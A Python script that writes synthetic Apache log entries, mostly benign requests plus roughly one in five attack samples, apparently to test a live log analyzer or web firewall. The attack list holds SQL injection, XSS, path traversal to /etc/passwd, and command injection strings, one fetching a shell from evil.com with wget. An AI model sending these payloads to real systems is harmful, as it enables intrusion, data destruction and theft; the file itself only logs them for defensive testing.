#!/usr/bin/env python3
"""
Live Log Generator
==================
Generates realistic log entries for testing the live log analyzer
"""

import time
import random
from datetime import datetime
from pathlib import Path

class LogGenerator:
    def __init__(self, log_file_path: str):
        self.log_file_path = Path(log_file_path)
        
    def generate_normal_requests(self) -> list:
        """Generate normal web requests"""
        normal_requests = [
            ('192.168.1.100', 'GET', '/index.html', '', 200, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'),
            ('192.168.1.101', 'GET', '/products', '', 200, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'),
            ('192.168.1.102', 'POST', '/api/login', '', 200, 'curl/7.68.0'),
            ('192.168.1.103', 'GET', '/search?q=laptop', '', 200, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'),
            ('192.168.1.104', 'GET', '/contact.html', '', 200, 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)'),
            ('192.168.1.105', 'PUT', '/api/users/123', '', 200, 'curl/7.68.0'),
        ]
        return normal_requests
    
    def generate_attack_requests(self) -> list:
        """Generate malicious attack requests"""
        attack_requests = [
            # SQL Injection attacks
            ('192.168.100.50', 'GET', '/search', 'q=\' OR 1=1--', 200, 'sqlmap/1.4.9'),
            ('192.168.100.51', 'POST', '/login', 'user=admin&pass=\' UNION SELECT * FROM users--', 200, 'Mozilla/5.0'),
            ('192.168.100.52', 'GET', '/products', 'id=1; DROP TABLE users;--', 200, 'curl/7.68.0'),
            
            # XSS attacks  
            ('192.168.100.60', 'GET', '/search', 'q=<script>alert(document.cookie)</script>', 200, 'Mozilla/5.0'),
            ('192.168.100.61', 'POST', '/comment', 'content=<img src=x onerror=alert(1)>', 200, 'Mozilla/5.0'),
            ('192.168.100.62', 'GET', '/profile', 'name=<svg onload=alert(1)>', 200, 'Mozilla/5.0'),
            
            # Path traversal attacks
            ('192.168.100.70', 'GET', '/admin/../../../etc/passwd', '', 404, 'curl/7.68.0'),
            ('192.168.100.71', 'GET', '/files/..\\..\\..\\windows\\system32\\config', '', 404, 'wget/1.20.3'),
            ('192.168.100.72', 'GET', '/download', 'file=../../../../etc/passwd', 403, 'Mozilla/5.0'),
            
            # Admin access attempts
            ('192.168.100.80', 'GET', '/admin/login', '', 401, 'Mozilla/5.0'),
            ('192.168.100.81', 'GET', '/wp-admin/', '', 404, 'nikto/2.1.6'),
            ('192.168.100.82', 'GET', '/phpmyadmin/', '', 404, 'Mozilla/5.0'),
            
            # Command injection
            ('192.168.100.90', 'GET', '/ping', 'host=127.0.0.1; cat /etc/passwd', 200, 'curl/7.68.0'),
            ('192.168.100.91', 'POST', '/system', 'cmd=ls && wget http://evil.com/shell', 200, 'Mozilla/5.0'),
        ]
        return attack_requests
    
    def create_log_entry(self, ip: str, method: str, path: str, query: str, status: int, user_agent: str) -> str:
        """Create a properly formatted Apache log entry"""
        timestamp = datetime.now().strftime('%d/%b/%Y:%H:%M:%S +0000')
        full_path = f"{path}?{query}" if query else path
        size = random.randint(100, 5000)
        
        log_entry = f'{ip} - - [{timestamp}] "{method} {full_path} HTTP/1.1" {status} {size} "-" "{user_agent}"'
        return log_entry
    
    def append_to_log(self, log_entry: str):
        """Append log entry to file"""
        with open(self.log_file_path, 'a') as f:
            f.write(log_entry + '\n')
        print(f"📝 Added: {log_entry}")
    
    def generate_mixed_traffic(self, duration: int = 60, interval: float = 3.0):
        """Generate mixed normal and attack traffic"""
        print(f"🚀 Generating mixed traffic for {duration} seconds...")
        print(f"📁 Writing to: {self.log_file_path}")
        
        normal_requests = self.generate_normal_requests()
        attack_requests = self.generate_attack_requests()
        
        start_time = time.time()
        iteration = 0
        
        try:
            while time.time() - start_time < duration:
                iteration += 1
                
                # 80% normal traffic, 20% attacks
                if random.random() < 0.8:
                    # Normal request
                    ip, method, path, query, status, user_agent = random.choice(normal_requests)
                    log_entry = self.create_log_entry(ip, method, path, query, status, user_agent)
                    self.append_to_log(log_entry)
                else:
                    # Attack request
                    ip, method, path, query, status, user_agent = random.choice(attack_requests)
                    log_entry = self.create_log_entry(ip, method, path, query, status, user_agent)
                    self.append_to_log(log_entry)
                
                time.sleep(interval)
                
        except KeyboardInterrupt:
            print("⏹️  Traffic generation stopped by user")
        
        print(f"✅ Generated {iteration} log entries")

if __name__ == "__main__":
    generator = LogGenerator('/Users/moturisaisushanth/Downloads/samplewar/live_waf_logs.log')
    generator.generate_mixed_traffic(duration=120, interval=2.0)  # Run for 2 minutes
